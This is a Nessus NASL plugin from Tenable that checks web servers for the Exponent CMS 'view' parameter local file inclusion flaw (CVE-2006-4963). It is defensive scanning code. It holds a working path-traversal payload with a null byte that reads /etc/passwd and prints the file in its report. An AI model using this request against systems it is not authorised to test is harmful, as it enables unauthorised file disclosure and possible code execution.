#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(22412);
  script_version("$Revision: 1.11 $");

  script_cve_id("CVE-2006-4963");
  script_bugtraq_id(20111);
  script_xref(name:"OSVDB", value:"29024");

  script_name(english:"Exponent CMS index.php view Variable Local File Inclusion");
  script_summary(english:"Tries to read a local file in Exponent CMS");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to a
local file include issue." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Exponent CMS, an open-source content
management system written in PHP. 

The version of Exponent CMS installed on the remote host fails to
properly sanitize user-supplied input to the 'view' parameter before
using it in the 'modules/calendarmodule/class.php' script to include
PHP code as part of its templating system.  Regardless of PHP's
'magic_quotes_gpc' and 'register_globals' settings, an unauthenticated
remote attacker may be able to exploit this issue to view arbitrary
files or to execute arbitrary PHP code on the remote host, subject to
the privileges of the web server user id." );
 script_set_attribute(attribute:"see_also", value:"http://milw0rm.com/exploits/2391" );
 script_set_attribute(attribute:"see_also", value:"http://www.exponentcms.org/index.php?action=view&id=35&module=newsmodule" );
 script_set_attribute(attribute:"solution", value:
"Apply the patches for 96.3 as described in the vendor's advisory
referenced above." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:N" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded:0);
if (!can_host_php(port:port)) exit(0);

# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/exponent", "/site", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Grab index.php.
  file = "../../../../../../../../../../etc/passwd%00";
  r = http_send_recv3(method:"GET",
    item:string(
      dir, "/index.php?",
      "src=1&",
      "_common=1&",
      "time=", unixtime(), "&",
      "action=show_view&",
      "module=calendarmodule&",
      "view=", file
    ),
    port:port
  );
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if there's an entry for root.
  if (egrep(pattern:"root:.*:0:[01]:", string:res))
  {
    contents = res;
    contents = strstr(contents, "perform this operation.");
    if (contents) contents = contents - "perform this operation.";
    if (contents) contents = contents - strstr(contents, "</td");

    if (contents && report_verbosity)
    {
      report = string(
        "\n",
        "Here are the contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        contents
      );
      security_warning(port:port, extra:report);
    }
    else security_warning(port);

    exit(0);
  }
}
